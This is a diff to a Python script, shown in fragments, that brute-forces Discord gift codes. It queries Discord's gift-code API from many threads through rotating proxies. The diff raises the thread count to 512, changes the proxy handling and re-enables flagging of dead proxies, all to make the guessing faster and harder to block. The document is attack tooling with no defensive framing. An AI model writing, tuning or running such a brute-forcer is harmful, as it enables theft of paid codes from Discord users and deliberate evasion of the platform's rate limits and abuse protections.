@@ -7,8 +7,8 @@ import os, os.path
 import time
 from requests.exceptions import ProxyError, SSLError, ConnectionError, InvalidProxyURL
 
-cpu_cores = 128
-timeout = 5;
+cpu_cores = 512
+timeout = 15
 start_time = time.time()
 os.environ["_THREADS"] = "0"
 threads = []
@@ -91,7 +91,7 @@ class bruteforceThread(threading.Thread):
 
                 url = 'https://discordapp.com/api/v6/entitlements/gift-codes/' + current_code + '?with_application=false&with_subscription_plan=true'
                 raw_proxy = getProxy()
-                proxy = {'https': 'https://' + raw_proxy}
+                proxy = {'http': 'http://' + raw_proxy}
 
                 s = requests.session()
                 response = s.get(url, proxies=proxy, timeout=timeout, headers={'Connection':'close'})
@@ -108,13 +108,13 @@ class bruteforceThread(threading.Thread):
             except ProxyError:
                 pass
             except SSLError:
-                #flagInvalidProxy(raw_proxy)
+                flagInvalidProxy(raw_proxy)
                 pass
             except ConnectionError:
-                #flagInvalidProxy(raw_proxy)
+                flagInvalidProxy(raw_proxy)
                 pass
             except InvalidProxyURL:
-                #flagInvalidProxy(raw_proxy)
+                flagInvalidProxy(raw_proxy)
                 pass
             else:
                 pass
